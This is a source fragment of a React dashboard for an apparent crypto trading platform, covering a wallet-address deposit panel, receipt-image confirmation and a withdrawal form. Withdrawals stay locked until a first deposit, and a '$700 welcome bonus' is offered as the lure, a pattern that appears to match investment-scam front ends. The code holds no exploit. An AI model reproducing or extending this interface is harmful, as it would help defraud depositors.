                          <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-xl outline-none font-black" placeholder="Amount..." />
                          <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Start Trade</button>
                        </div>
                      </div>
                    )}
                  </div>
                )
              })}
            </div>
          </div>

          <div className="space-y-6">
            <div ref={depositSectionRef} className="bg-[#1e222d] border border-white/5 rounded-[3rem] p-8 shadow-2xl">
              <h3 className="text-lg font-black text-white uppercase mb-6 italic">Secure Wallet Handshake</h3>

              {/* Network Selector */}
              <div className="flex gap-2 mb-6">
                {NETWORKS.map(net => (
                  <button
                    key={net.id}
                    onClick={() => handleNetworkChange(net)}
                    className={`flex-1 py-3 rounded-xl font-black uppercase text-[10px] transition-all border ${selectedNetwork.id === net.id ? 'bg-[#00b36b] border-[#00b36b] text-white shadow-lg' : 'bg-white/5 border-white/10 text-gray-400 hover:bg-white/10'}`}
                  >
                    {net.name.split(' ')[0]} <span className="hidden sm:inline">{net.name.split(' ')[1]}</span>
                  </button>
                ))}
              </div>

              <div className="bg-black/60 p-6 rounded-[2rem] border border-[#f01a64]/20 mb-8 text-center space-y-4">
                <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest">Selected Network: <span className="text-[#00b36b]">{selectedNetwork.name}</span></span>
                <div className="bg-[#0f1116] p-4 rounded-xl text-[10px] font-mono text-white break-all shadow-inner">{depositAddress}</div>
                <button onClick={() => { navigator.clipboard.writeText(depositAddress); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1500); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase transition-all ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 text-white border border-white/10'}`}>
                  {copySuccess ? 'ADDRESS COPIED' : 'Copy Wallet Address'}
                </button>
              </div>
              <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
              <button onClick={() => fileInputRef.current?.click()} disabled={isVerifyingReceipt} className="w-full py-5 bg-[#f01a64] text-white rounded-2xl font-black uppercase tracking-[0.2em] text-[11px] disabled:opacity-50 shadow-xl transition-all active:scale-95">
                {isVerifyingReceipt ? (
                  <div className="flex items-center justify-center gap-3">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                    <span>{verificationStatus}</span>
                  </div>
                ) : 'Confirm Transaction'}
              </button>
              {verificationError && <p className="text-red-500 text-[10px] font-black mt-3 text-center uppercase tracking-tighter">{verificationError}</p>}
            </div>

            <div className="bg-[#1e222d] border border-white/5 p-8 rounded-[3rem] shadow-2xl">
              <h3 className="text-lg font-black text-white uppercase text-center mb-8 italic">Profit Withdrawal</h3>
              {withdrawStep === 'input' && (
                <div className="space-y-6">
                  {!user?.hasDeposited ? (
                    <div className="text-center space-y-4 py-4">
                      <div className="w-16 h-16 bg-amber-500/20 border border-amber-500/30 rounded-full flex items-center justify-center mx-auto">
                        <span className="text-2xl">🔒</span>
                      </div>
                      <p className="text-amber-400 font-bold text-sm">Withdrawals Locked</p>
                      <p className="text-gray-500 text-[10px]">Complete your first deposit to unlock payouts and your $700 welcome bonus.</p>
                      <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="w-full py-4 bg-amber-500 text-black rounded-xl font-black uppercase text-[10px] tracking-widest active:scale-95">Make First Deposit</button>
                    </div>
                  ) : (
                    <>
                      {/* Network Selection for Withdrawal */}
                      <div className="space-y-3">
                        <label className="text-[9px] text-gray-500 font-black uppercase tracking-widest ml-1">Select Payout Network</label>
                        <div className="flex gap-2">
                          {NETWORKS.map((net) => (
                            <button
                              key={`withdraw-${net.id}`}
                              onClick={() => setWithdrawNetwork(net)}
                              className={`flex-1 py-3 rounded-xl font-black uppercase text-[9px] transition-all border ${withdrawNetwork.id === net.id ? 'bg-[#f01a64] border-[#f01a64] text-white shadow-lg' : 'bg-white/5 border-white/10 text-gray-400 hover:bg-white/10'}`}
                            >
                              {net.name.split(' ')[1].replace(/[()]/g, '')}
                            </button>
                          ))}
                        </div>
                      </div>

                      <div className="space-y-4">
                        <div className="space-y-2">
                          <label className="text-[9px] text-gray-500 font-black uppercase tracking-widest ml-1">{withdrawNetwork.name} Wallet Address</label>
                          <input type="text" placeholder="Paste your address here..." value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black uppercase placeholder:text-gray-700 focus:border-[#f01a64]/50 transition-colors" />
                        </div>

                        <div className="space-y-2">
                          <label className="text-[9px] text-gray-500 font-black uppercase tracking-widest ml-1">Amount to Payout (USDT)</label>
                          <input type="number" placeholder="0.00" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-[10px] text-white outline-none font-black placeholder:text-gray-700 focus:border-[#f01a64]/50 transition-colors" />
                        </div>
                      </div>

                      {withdrawError && <p className="text-red-500 text-[9px] font-black text-center italic">{withdrawError}</p>}
                      <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px] shadow-lg active:scale-95 transition-all mt-4">Review Settlement</button>
                    </>
                  )}
                </div>
              )}
              {withdrawStep === 'confirm' && (
                <div className="space-y-6 text-center">
                  <p className="text-white font-black text-xl italic">${withdrawAmount}</p>
                  <p className="text-[10px] text-gray-500 uppercase tracking-widest break-all px-4">{withdrawAddress}</p>
                  <div className="flex gap-3">
                    <button onClick={() => setWithdrawStep('input')} className="flex-1 py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase">Edit</button>
                    <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase shadow-xl transition-all active:scale-95 disabled:opacity-80">
                      {isWithdrawing ? (
                        <span className="animate-pulse">{withdrawStatus}</span>
                      ) : 'Confirm Withdrawal'}
                    </button>
                  </div>
                </div>
              )}
              {withdrawStep === 'success' && (
                <div className="text-center space-y-6 animate-in zoom-in-95">
                  <div className="w-16 h-16 bg-[#00b36b]/20 border border-[#00b36b]/40 rounded-full flex items-center justify-center mx-auto text-[#00b36b]">
                    <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                  </div>
                  <p className="text-white font-black text-xs uppercase tracking-widest">Payout Queued for Stream {user?.nodeId}</p>
                  <button onClick={() => setWithdrawStep('input')} className="w-full py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase transition-all active:scale-95">Close Terminal</button>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
      {showReferral && (
        <ReferralTerminal onClose={() => setShowReferral(false)} />
      )}

      <StrategyModal
        isOpen={isStrategyModalOpen}
        onClose={() => setIsStrategyModalOpen(false)}
        strategies={strategies}
        onSelectStrategy={setSelectedPlanId}
        userBalance={user?.balance || 0}
        hasDeposited={!!user?.hasDeposited}
        isDemoActive={isDemoActive}
        demoTradeCount={demoTradeCount}
      />
    </div>
  );
};

export default Dashboard;